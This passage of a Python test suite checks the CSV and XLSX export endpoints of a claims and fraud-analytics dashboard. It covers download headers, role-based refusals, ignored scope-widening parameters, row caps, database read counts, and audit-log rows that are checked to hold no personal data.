    assert rows[1:] == [[item["key"], str(item["count"])] for item in payload["byBand"]["items"]]
    # …and against the seed oracle for the unfiltered book, which is the second
    # implementation the route comparison above cannot be.
    unfiltered = parse_csv(
        (await get_export(seeded_db_url, *ANALYST, FRAUD_EXPORT, {"table": "bands"})).content
    )
    assert unfiltered == [expected["columns"], *expected["rows"]]


@requires_db
async def test_the_breakdown_export_is_the_cards_own_bars(seeded_db_url: str) -> None:
    """The money, against the card and against the seed oracle.

    Money is where an oracle that agrees with the implementation does the most
    damage, so both comparisons are made: the route's payload (which proves the
    file and the screen agree) and `seed_fixture.expected_breakdown_export`
    (which proves they agree with the seed).
    """
    payload = await get_json(
        seeded_db_url, *ANALYST, "/dashboard/financials", params={"groupBy": "icd10"}
    )
    resp = await get_export(
        seeded_db_url, *ANALYST, FINANCIALS_EXPORT, {"table": "breakdown", "groupBy": "icd10"}
    )
    rows = parse_csv(resp.content)
    expected = seed_fixture.expected_breakdown_export(*ANALYST, "icd10", BREAKDOWN_LIMIT)

    assert rows == [expected["columns"], *expected["rows"]]
    assert [row[1] for row in rows[1:]] == [group["key"] for group in payload["breakdown"]["items"]]
    assert [row[6] for row in rows[1:]] == [
        str(group["totals"]["projectedCents"]) for group in payload["breakdown"]["items"]
    ]


@requires_db
@pytest.mark.parametrize("path,params", EXPORT_ROUTES)
async def test_every_export_answers_a_file_with_the_headers_a_download_needs(
    seeded_db_url: str, path: str, params: dict[str, str]
) -> None:
    """`text/csv`, `attachment`, `no-store` — on all eight target/route pairs.

    The three together are what makes this a download rather than a page: without
    the disposition a browser renders CSV as text in the tab, and without
    `no-store` one persona's book is cacheable by an intermediary.
    """
    resp = await get_export(seeded_db_url, *ANALYST, path, params)

    assert resp.status_code == 200, resp.text
    assert resp.headers["content-type"].startswith("text/csv")
    assert resp.headers["cache-control"] == "no-store"
    assert resp.headers["content-disposition"].startswith('attachment; filename="lineworker-')
    assert resp.headers["content-disposition"].endswith('.csv"')


@requires_db
@pytest.mark.parametrize("path,params", EXPORT_ROUTES)
async def test_every_export_serves_a_spreadsheet_too(
    seeded_db_url: str, path: str, params: dict[str, str]
) -> None:
    """The XLSX half, on the same eight pairs, asserted as a real zip container.

    ZIP magic bytes rather than the media type alone: a route that answered the
    spreadsheet content type with CSV bytes would satisfy a header check and
    would fail to open.
    """
    resp = await get_export(seeded_db_url, *ANALYST, path, params, fmt="xlsx")

    assert resp.status_code == 200, resp.text
    assert resp.headers["content-type"] == MEDIA_TYPE[ExportFormat.xlsx]
    assert resp.headers["content-disposition"].endswith('.xlsx"')
    assert resp.content[:2] == b"PK"


@requires_db
@pytest.mark.parametrize("path,params", EXPORT_ROUTES)
async def test_the_spreadsheet_holds_the_csvs_values(
    seeded_db_url: str, path: str, params: dict[str, str]
) -> None:
    """Cell for cell, on real data, read back through `zipfile` and `xml.etree`.

    The two formats are two renderings of one table and must not become two
    answers. Read with the stdlib rather than with the library that wrote the
    file, because a reader that is the writer proves nothing.
    """
    csv_rows = parse_csv((await get_export(seeded_db_url, *ANALYST, path, params)).content)
    xlsx_rows = _xlsx_rows(
        (await get_export(seeded_db_url, *ANALYST, path, params, fmt="xlsx")).content
    )

    assert xlsx_rows == csv_rows


@requires_db
@pytest.mark.parametrize("path,params", EXPORT_ROUTES)
async def test_a_smuggled_scope_changes_not_one_byte(
    seeded_db_url: str, path: str, params: dict[str, str]
) -> None:
    """`employerId`, `scopeAll` and `userId` are unknown parameters, ignored.

    Byte-identity rather than "the same number of rows", because a widened scope
    on this seed would change the *content* long before it changed a count on
    some of these targets — the band distribution has three rows whatever book it
    describes.
    """
    honest = await get_export(seeded_db_url, *ANALYST, path, params)
    smuggled = await get_export(
        seeded_db_url,
        *ANALYST,
        path,
        {**params, "employerId": "1", "scopeAll": "true", "userId": "1"},
    )

    assert smuggled.status_code == 200, smuggled.text
    assert smuggled.content == honest.content


@requires_db
@pytest.mark.parametrize("path,params", EXPORT_ROUTES)
async def test_a_supervisor_and_a_handler_are_both_refused(
    seeded_db_url: str, path: str, params: dict[str, str]
) -> None:
    """The inversion Story 7.1 introduced, holding for the export of every
    section — including the claim list, whose *paged* sibling is deliberately
    ungated.

    That asymmetry is the one worth asserting rather than assuming: the list
    shows claims the session can already open one at a time, and its export moves
    PHI out of the system. A handler entitled to read her queue is not thereby
    entitled to extract it.
    """
    for persona in (SUPERVISOR, HANDLER):
        async with make_client(seeded_db_url) as client:
            await login_as(client, *persona)
            resp = await client.get(path, params={**params, "format": "csv"})

        assert resp.status_code == 403, resp.text
        assert resp.json()["type"] == "/problems/fraud-analytics-not-permitted"
        assert resp.headers["cache-control"] == "no-store"
        assert "content-disposition" not in resp.headers


@requires_db
async def test_the_refusal_happens_before_any_claim_is_read(
    db: AsyncSession, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The ordering, asserted rather than described, on all six services.

    A refusal that depended on what the scoped read returned would answer
    differently for an analyst with employers and one between assignments, which
    is an oracle about the assignment table.
    """

    async def forbidden(*_args: Any, **_kwargs: Any) -> Any:
        raise AssertionError("a claim was read before the refusal")

    monkeypatch.setattr(claim_repo, "select_drill_rows", forbidden)
    monkeypatch.setattr(claim_repo, "select_claim_columns_with_employer_and_employee", forbidden)
    ctx = CallerContext(user_id=1, role=UserRole.supervisor, employer_ids=frozenset({1}))
    thresholds = await thresholds_for(db)
    limits = await export_limits_for(db)

    with pytest.raises(fraud_service.FraudAnalyticsNotPermitted):
        await export_claims(
            db, ctx, thresholds, await weights_for(db), limits, DrillFilters(), ExportFormat.csv
        )
    with pytest.raises(fraud_service.FraudAnalyticsNotPermitted):
        await export_fraud(
            db, ctx, thresholds, limits, Segmentation(), ExportTarget.fraud_bands, ExportFormat.csv
        )
    with pytest.raises(fraud_service.FraudAnalyticsNotPermitted):
        await export_fraud_rates(
            db, ctx, thresholds, limits, FraudRateSorts(), Segmentation(), ExportFormat.csv
        )
    with pytest.raises(fraud_service.FraudAnalyticsNotPermitted):
        await export_trends(
            db,
            ctx,
            thresholds,
            await trend_periods_for(db),
            SETTINGS,
            limits,
            Segmentation(),
            ExportFormat.csv,
        )
    with pytest.raises(fraud_service.FraudAnalyticsNotPermitted):
        await export_financials(
            db,
            ctx,
            thresholds,
            limits,
            Segmentation(),
            ExportTarget.financial_breakdown,
            ExportFormat.csv,
        )
    with pytest.raises(fraud_service.FraudAnalyticsNotPermitted):
        await export_reserve_adequacy(
            db,
            ctx,
            thresholds,
            await reserve_bands_for(db),
            limits,
            Segmentation(),
            ExportFormat.csv,
        )


@requires_db
@pytest.mark.parametrize("path,params", EXPORT_ROUTES)
async def test_a_refused_caller_loads_no_rule_document_either(
    seeded_db_url: str, monkeypatch: pytest.MonkeyPatch, path: str, params: dict[str, str]
) -> None:
    """The gate is above the document loads in every route, not below them.

    Parametrised over all eight pairs because two of the routes load *three*
    documents, and a gate placed between two of them would refuse after one read
    — which is exactly the shape "answered before any read" is written to
    exclude. `export_limits_for` is patched alongside the others precisely
    because it is the one this story adds and therefore the one a new route could
    accidentally load first.
    """
    from api.routers import dashboard as dashboard_router

    async def forbidden(*_args: Any, **_kwargs: Any) -> Any:
        raise AssertionError("a rule document was loaded before the refusal")

    monkeypatch.setattr(dashboard_router, "thresholds_for", forbidden)
    monkeypatch.setattr(dashboard_router, "weights_for", forbidden)
    monkeypatch.setattr(dashboard_router, "reserve_bands_for", forbidden)
    monkeypatch.setattr(dashboard_router, "trend_periods_for", forbidden)
    monkeypatch.setattr(dashboard_router, "export_limits_for", forbidden)

    async with make_client(seeded_db_url) as client:
        await login_as(client, *SUPERVISOR)
        resp = await client.get(path, params={**params, "format": "csv"})

    assert resp.status_code == 403
    assert resp.json()["type"] == "/problems/fraud-analytics-not-permitted"


@requires_db
@pytest.mark.parametrize("fmt", ["pdf", "json", ""])
async def test_an_unknown_format_is_refused_by_the_contract(seeded_db_url: str, fmt: str) -> None:
    """The type *is* the check — 422 before the service runs, so no audit row.

    `pdf` is the interesting one: it is named in the story as out of scope, and a
    caller who asks for it should be told the vocabulary rather than handed a CSV
    that opens as garbage in whatever they meant to use.
    """
    async with make_client(seeded_db_url) as client:
        await login_as(client, *ANALYST)
        resp = await client.get(CLAIMS_EXPORT, params={"format": fmt})

    assert resp.status_code == 422
    assert resp.json()["type"] == "/problems/validation-error"


@requires_db
async def test_an_unknown_table_is_refused_by_the_contract(seeded_db_url: str) -> None:
    """`table=redFlags` is a 422, which is also how the one deliberately
    unexportable surface refuses: the red-flag view is model output (AD-10), and
    a CSV strips the labelling and the timestamp that keep it from reading as
    fact."""
    async with make_client(seeded_db_url) as client:
        await login_as(client, *ANALYST)
        resp = await client.get(FRAUD_EXPORT, params={"table": "redFlags", "format": "csv"})

    assert resp.status_code == 422
    assert resp.json()["type"] == "/problems/validation-error"


@requires_db
async def test_an_impossible_segment_exports_a_header_and_nothing_under_it(
    seeded_db_url: str,
) -> None:
    """A filter no claim satisfies is a 200 with a header row — never an error,
    and never an empty file.

    On the claim list the file is one line; on the band distribution it is four,
    because the vocabulary is a rule's and stays complete. Both are asserted,
    because the two behaviours are different and a reader has to be able to tell
    "your filter matched nothing" from "this rule found nothing".
    """
    impossible = {"filter[sector]": "Aerospace", "filter[state]": "MI"}

    claims = parse_csv(
        (await get_export(seeded_db_url, *ANALYST, CLAIMS_EXPORT, impossible)).content
    )
    bands = parse_csv(
        (
            await get_export(
                seeded_db_url, *ANALYST, FRAUD_EXPORT, {**impossible, "table": "bands"}
            )
        ).content
    )

    assert claims == [list(seed_fixture.EXPORT_CLAIM_COLUMNS)]
    assert bands[0] == ["fraud_band", "claims"]
    assert [row[1] for row in bands[1:]] == ["0", "0", "0"]


@requires_db
async def test_an_export_over_the_cap_is_refused_and_names_it(
    db: AsyncSession, seeded_db_url: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    """AC 4 and AC 7 in one request: the refusal quotes the *document's* value.

    The cap is retuned by patching the loader rather than by writing a rule
    document, which is the honest shape for this assertion: what AC 7 promises is
    that the number in the refusal comes from the tier rather than from the code,
    and a test that patched a module constant could not tell the two apart.

    **No audit row and no bytes.** Both are checked, because an egress log
    recording an export that never happened would make the one question it exists
    to answer — what left this system — answerable only with a second source.
    """
    before = len(await audit_rows(db))

    async def tiny(*_args: Any, **_kwargs: Any) -> ExportLimits:
        return ExportLimits(version=1, max_rows=7)

    from api.routers import dashboard as dashboard_router

    monkeypatch.setattr(dashboard_router, "export_limits_for", tiny)
    resp = await get_export(seeded_db_url, *ANALYST, CLAIMS_EXPORT)

    assert resp.status_code == 422
    body = resp.json()
    assert body["type"] == "/problems/export-too-large"
    assert "7" in body["detail"] and str(SEEDED_CLAIMS) in body["detail"]
    assert "content-disposition" not in resp.headers
    assert resp.headers["cache-control"] == "no-store"
    assert len(await audit_rows(db)) == before


@requires_db
async def test_the_export_takes_one_scoped_read_for_five_of_six(db: AsyncSession) -> None:
    """The read count, guarded — an export that took a second read would be the
    first analyst surface to do so without saying why.

    Five of the six make exactly one scoped read: the claim list (with no
    `filter[reserveVerdict]`, which is the paged route's own documented
    exception), the two fraud entry points, the trends and the financials. The
    audit `INSERT` is not a read and is excluded by name rather than by count,
    because counting "statements" would otherwise make this test drift the day
    the audit row grew a second statement.
    """
    ctx = await context_for(db, *ANALYST)
    thresholds = await thresholds_for(db)
    limits = await export_limits_for(db)
    calls: tuple[Callable[[], Awaitable[ExportTable]], ...] = (
        lambda: export_claims(
            db, ctx, thresholds, _weights(), limits, DrillFilters(), ExportFormat.csv
        ),
        lambda: export_fraud(
            db, ctx, thresholds, limits, Segmentation(), ExportTarget.fraud_bands, ExportFormat.csv
        ),
        lambda: export_fraud_rates(
            db, ctx, thresholds, limits, FraudRateSorts(), Segmentation(), ExportFormat.csv
        ),
        lambda: export_financials(
            db,
            ctx,
            thresholds,
            limits,
            Segmentation(),
            ExportTarget.financial_breakdown,
            ExportFormat.csv,
        ),
    )
    for call in calls:
        executed: list[str] = []
        original, counting = _counting(db, executed)
        db.execute = counting  # type: ignore[method-assign]
        try:
            await call()
        finally:
            db.execute = original  # type: ignore[method-assign]
        selects = [statement for statement in executed if statement.startswith("SELECT")]
        assert len(selects) == 1, selects


@requires_db
async def test_the_adequacy_export_takes_three_scoped_reads(db: AsyncSession) -> None:
    """Three, and the number is the point rather than an accident.

    The claims, then the payment-schedule weeks and the bills in bulk — inherited
    from `decomposition.reserve_adequacy` rather than re-implemented, which is
    also what makes AC 2's "never a re-derivation" true of the file. The obvious
    wrong implementation on this path is a loop over `reserve_check_for_claim`,
    which would be 3N reads *and* N schedule refreshes on a read-only route.
    """
    ctx = await context_for(db, *ANALYST)
    # The three parameter blocks are loaded **before** the counter is installed,
    # for the reason they arrive as arguments in the first place: the route loads
    # them, and counting them here would be counting the route's reads under the
    # service's name.
    thresholds = await thresholds_for(db)
    bands = await reserve_bands_for(db)
    limits = await export_limits_for(db)
    executed: list[str] = []
    original, counting = _counting(db, executed)
    db.execute = counting  # type: ignore[method-assign]
    try:
        await export_reserve_adequacy(
            db, ctx, thresholds, bands, limits, Segmentation(), ExportFormat.csv
        )
    finally:
        db.execute = original  # type: ignore[method-assign]

    selects = [statement for statement in executed if statement.startswith("SELECT")]
    assert len(selects) == 3, selects


@requires_db
async def test_a_narrowed_analyst_exports_only_their_own_book(db: AsyncSession) -> None:
    """Scope at the service level, with a hand-built context (AD-7).

    The seed's one analyst is `scope_all`, so no HTTP request in this codebase can
    demonstrate a narrowed one — the gap this story was named as the candidate to
    close and declines again, re-recorded in `deferred-work.md`. What can be
    demonstrated, and is, is that the *export* honours the scope predicate the
    same way every aggregate does: the same code path, a different context.
    """
    scoped_ids = await employer_ids_for(
        db, (await context_for(db, "Jennifer Park", "supervisor")).user_id
    )
    ctx = CallerContext(user_id=1, role=UserRole.analyst, employer_ids=scoped_ids)

    table = await export_claims(
        db,
        ctx,
        await thresholds_for(db),
        await weights_for(db),
        await export_limits_for(db),
        DrillFilters(),
        ExportFormat.csv,
    )
    everyone = await export_claims(
        db,
        await context_for(db, *ANALYST),
        await thresholds_for(db),
        await weights_for(db),
        await export_limits_for(db),
        DrillFilters(),
        ExportFormat.csv,
    )

    exported = {row[0] for row in table.rows}
    assert 0 < len(exported) < len({row[0] for row in everyone.rows}) == SEEDED_CLAIMS
    assert exported <= seed_fixture.expected_claim_ids("Jennifer Park", "supervisor")


# --- the audit row ---------------------------------------------------------


@requires_db
async def test_one_successful_export_writes_exactly_one_content_free_event(
    db: AsyncSession, seeded_db_url: str
) -> None:
    """AC 2, field by field — and the content scan is the assertion that matters.

    Key names prove nothing: a row could carry `{"filters": {...}}` and still hold
    a worker's name inside it. So the serialised payload is scanned for a seeded
    worker's name and a seeded employer label, which are the two kinds of value
    the export's own rows are full of and neither of which may appear here.
    """
    before = len(await audit_rows(db))
    resp = await get_export(seeded_db_url, *ANALYST, CLAIMS_EXPORT, TWO_DIMENSIONS)
    rows = await audit_rows(db)

    assert resp.status_code == 200
    assert len(rows) == before + 1
    event = rows[-1]
    assert event.action == "export.csv"
    assert event.entity == "claims"
    assert event.entity_id and len(event.entity_id) == 16
    assert event.before is None
    assert set(event.after or {}) == {"target", "format", "rows", "filters"}
    assert (event.after or {})["rows"] == len(parse_csv(resp.content)) - 1
    # **The full wire spelling, brackets included.** `record_export`'s docstring
    # promises a mapping a reader can paste into a URL, and `severityBand` is not
    # that — no route accepts it; `filter[severityBand]` is what the six declare.
    # It also read as a different convention from the controls in the same
    # mapping, which have always carried theirs (`sort[injuryType]`, `groupBy`).
    assert (event.after or {})["filters"] == {
        "filter[severityBand]": "high",
        "filter[sector]": "Aerospace",
    }
    # …and the keys are exactly the query the request carried, which is the
    # paste-able claim stated as a check rather than as prose.
    assert set((event.after or {})["filters"]) == set(TWO_DIMENSIONS)

    serialised = json.dumps(event.after)
    worker = seed_fixture.seed()["employees"][0]["name"]
    employer = seed_fixture.employer_short_names()[seed_fixture.seed()["claims"][0]["employer"]]
    assert worker not in serialised
    assert employer not in serialised
    for claim in seed_fixture.claims_for(*ANALYST)[:20]:
        assert claim["claim_id"] not in serialised


@requires_db
async def test_the_whole_set_of_actions_on_this_path_is_the_two_formats(
    db: AsyncSession, seeded_db_url: str
) -> None:
    """`{"export.csv", "export.xlsx"}` and nothing else — over **every** row the
    path wrote, not every row that already looked like an export.

    `test_ai_insights.py:999`'s idiom, which this test previously claimed and did
    not have: it read `audit_rows`, whose `WHERE action LIKE 'export.%'` filters
    out precisely the row the assertion is about. A stray `claim.updated` or a
    second family emitted somewhere on the export path was excluded from the set
    *before* the set was compared to two names, so the docstring's "a statement
    about every row" was a statement about every row that had already passed the
    test. Naming the actions that should appear leaves a second, unnoticed action
    free to appear beside them — which is the whole reason this shape exists.

    So the rows are bounded by **id** rather than by action: everything written
    from here to the end of the two requests, whatever it is called. That is also
    what makes it a statement about *this path* rather than about the shared
    seeded database, which is append-only and carries whatever earlier tests in
    this module exported.
    """
    highest = await db.scalar(sa.select(sa.func.max(AuditEvent.id))) or 0
    for fmt in ("csv", "xlsx"):
        await get_export(seeded_db_url, *ANALYST, FRAUD_EXPORT, {"table": "bands"}, fmt=fmt)

    written = list(
        (
            await db.scalars(
                sa.select(AuditEvent).where(AuditEvent.id > highest).order_by(AuditEvent.id)
            )
        ).all()
    )

    assert {event.action for event in written} == {"export.csv", "export.xlsx"}
    # Two requests, two rows: an action set alone cannot tell one export from a
    # second one nobody asked for under the same name.
    assert len(written) == 2


@requires_db
async def test_the_entity_names_the_target_and_the_digest_names_the_slice(
    db: AsyncSession, seeded_db_url: str
) -> None:
    """The digest groups repeats of one slice and separates different ones.

    That is the whole of what `entity_id` buys: after AD-11's purge overwrites
    `after`, "the same slice was exported three times last week" is still a
    question the skeleton can answer, and "these two were different slices" is
    still a distinction it can draw.
    """
    await get_export(seeded_db_url, *ANALYST, FRAUD_EXPORT, {**TWO_DIMENSIONS, "table": "bands"})
    await get_export(seeded_db_url, *ANALYST, FRAUD_EXPORT, {**TWO_DIMENSIONS, "table": "bands"})
    await get_export(
        seeded_db_url, *ANALYST, FRAUD_EXPORT, {"filter[sector]": "Automotive", "table": "bands"}
    )
    # The **tail**, because the seeded database is shared across this module and
    # audit rows are append-only: a test that read the whole table would be
    # asserting about every export any other test in the file happened to make.
    rows = (await audit_rows(db))[-3:]

    assert [event.entity for event in rows] == ["fraud_bands"] * 3
    assert rows[0].entity_id == rows[1].entity_id
    assert rows[2].entity_id != rows[0].entity_id


def test_two_different_filter_sets_never_share_a_digest() -> None:
    """The collision the first canonical form allowed, as a pair.

    The digest used to be `\\x1e`.join(f"{key}\\x1f{value}") over sorted keys, on
    the argument that `=`/`&` could not be separators because a facet value may
    contain them. That argument was right about `=` and `&` and wrong to stop
    there: it moved the collision onto two rarer characters instead of removing
    it. Both are reachable — `filter[injuryType]=A%1Fb` decodes to a value
    holding `\\x1f`, and none of the five free-text facets has a vocabulary
    anything validates — so two genuinely different slices hashed to one id, and
    a compliance reader grouping *redacted* rows by `entity_id` would have been
    told they were the same export. That is the only question `entity_id` exists
    to answer, so a collision does not degrade it, it defeats it.

    The pair below is the minimal witness under the old scheme: both sets
    serialise to the identical `k\\x1fA\\x1fb\\x1e…` byte string. JSON has no
    such pair, because every delimiter it emits is one the encoder escapes inside
    a value — which is what "unambiguous" means and what the old form only
    approximated.
    """
    collides = ({"a": "A\x1fb"}, {"a\x1fA": "b"})
    old_form = [
        "\x1e".join(f"{key}\x1f{filters[key]}" for key in sorted(filters)) for filters in collides
    ]

    # The witness is real: the retired canonical form cannot tell these apart.
    assert old_form[0] == old_form[1]
    assert audit_module._filter_digest(collides[0]) != audit_module._filter_digest(collides[1])
    # …and the property the digest is actually for still holds: key order is not
    # part of the slice, so two spellings of one query string group together.
    assert audit_module._filter_digest(
        {"filter[sector]": "Aerospace", "groupBy": "icd10"}
    ) == audit_module._filter_digest({"groupBy": "icd10", "filter[sector]": "Aerospace"})


@requires_db
async def test_a_surfaces_own_controls_reach_the_audit_row(
    db: AsyncSession, seeded_db_url: str
) -> None:
    """A grouping and a sort change the file, so they change the row.

    A row that recorded only the facets would say that a breakdown by ICD-10 and
    a breakdown by employer were the same export from the same filter set, which
    is exactly the question a compliance reader asks a log to answer.
    """
    await get_export(
        seeded_db_url, *ANALYST, FINANCIALS_EXPORT, {"table": "breakdown", "groupBy": "icd10"}
    )
    await get_export(seeded_db_url, *ANALYST, FRAUD_RATES_EXPORT, {"sort[employer]": "label_asc"})
    # The tail — see `test_the_entity_names_the_target_and_the_digest_names_the_slice`.
    rows = (await audit_rows(db))[-2:]

    assert (rows[0].after or {})["filters"] == {"groupBy": "icd10"}
    assert (rows[1].after or {})["filters"] == {
        "sort[injuryType]": "rate_desc",
        "sort[employer]": "label_asc",
        "sort[handler]": "rate_desc",
    }


@requires_db
async def test_a_refused_export_writes_nothing(db: AsyncSession, seeded_db_url: str) -> None:
    """Neither the role refusal nor the cap refusal leaves a trace (AC 4).

    Counted before and after rather than asserted absent, because other rows
    exist: what must not happen is a *refused* request adding one.
    """
    before = len(await audit_rows(db))

    async with make_client(seeded_db_url) as client:
        await login_as(client, *SUPERVISOR)
        assert (await client.get(CLAIMS_EXPORT, params={"format": "csv"})).status_code == 403
    async with make_client(seeded_db_url) as client:
        await login_as(client, *ANALYST)
        assert (await client.get(CLAIMS_EXPORT, params={"format": "pdf"})).status_code == 422

    assert len(await audit_rows(db)) == before


# --- the contract ----------------------------------------------------------


def _parameters(schema: dict[str, Any], path: str) -> set[str]:
    return {parameter["name"] for parameter in schema["paths"][path]["get"]["parameters"]}


@requires_db
async def test_each_export_route_declares_exactly_its_siblings_parameters(
    seeded_db_url: str,
) -> None:
    """Six allowlists rather than one assertion of emptiness.

    The point of six routes rather than one is that each declares precisely its
    sibling's parameter surface and nothing a caller could smuggle in and have
    ignored — so the proof is six exact sets, written out here rather than read
    off the code under test.
    """
    async with make_client(seeded_db_url) as client:
        schema = (await client.get("/openapi.json")).json()
    facets = {f"filter[{key}]" for key in DRILL_PARAMETERS}
    dimensions = {f"filter[{key}]" for key in SEGMENTATION_PARAMETERS}

    assert _parameters(schema, CLAIMS_EXPORT) == facets | {"format"}
    assert _parameters(schema, FRAUD_EXPORT) == dimensions | {"table", "format"}
    assert _parameters(schema, FRAUD_RATES_EXPORT) == dimensions | {
        "sort[injuryType]",
        "sort[employer]",
        "sort[handler]",
        "format",
    }
    assert _parameters(schema, TRENDS_EXPORT) == dimensions | {
        "grain",
        "anchor",
        "cohort",
        "from",
        "to",
        "format",
    }
    assert _parameters(schema, FINANCIALS_EXPORT) == dimensions | {"table", "groupBy", "format"}
    assert _parameters(schema, ADEQUACY_EXPORT) == dimensions | {"format"}


@requires_db
async def test_the_list_and_its_export_declare_the_same_facets(seeded_db_url: str) -> None:
    """The refactor's proof, and the reason `_drill_filters` exists.

    A list and an export of it that could declare different facets is the failure
    this story exists to prevent — an export ignoring a narrowing the list
    applies produces a file that is not the list it came from. Compared as sets
    rather than asserted against a literal on both sides, so the two move
    together or not at all.
    """
    async with make_client(seeded_db_url) as client:
        schema = (await client.get("/openapi.json")).json()

    list_facets = {name for name in _parameters(schema, DRILL) if name.startswith("filter[")}
    export_facets = {
        name for name in _parameters(schema, CLAIMS_EXPORT) if name.startswith("filter[")
    }

    assert list_facets == export_facets == {f"filter[{key}]" for key in DRILL_PARAMETERS}


@requires_db
async def test_every_export_route_publishes_both_media_types(seeded_db_url: str) -> None:
    """The OpenAPI document says what kind of file, and says both.

    There is no response model — the body is a file — so a client generator has
    nothing else to read, and a missing `format: binary` is what turns a
    generated download into a string the client tries to parse.
    """
    async with make_client(seeded_db_url) as client:
        schema = (await client.get("/openapi.json")).json()

    for path in (
        CLAIMS_EXPORT,
        FRAUD_EXPORT,
        FRAUD_RATES_EXPORT,
        TRENDS_EXPORT,
        FINANCIALS_EXPORT,
        ADEQUACY_EXPORT,
    ):
        content = schema["paths"][path]["get"]["responses"]["200"]["content"]
        assert set(content) == set(MEDIA_TYPE.values())
        assert all(entry["schema"]["format"] == "binary" for entry in content.values())


@requires_db
@pytest.mark.parametrize("path,params", [(path, params) for path, params in EXPORT_ROUTES])
async def test_every_export_requires_a_session(
    seeded_db_url: str, path: str, params: dict[str, str]
) -> None:
    async with make_client(seeded_db_url) as client:
        resp = await client.get(path, params={**params, "format": "csv"})

    assert resp.status_code == 401
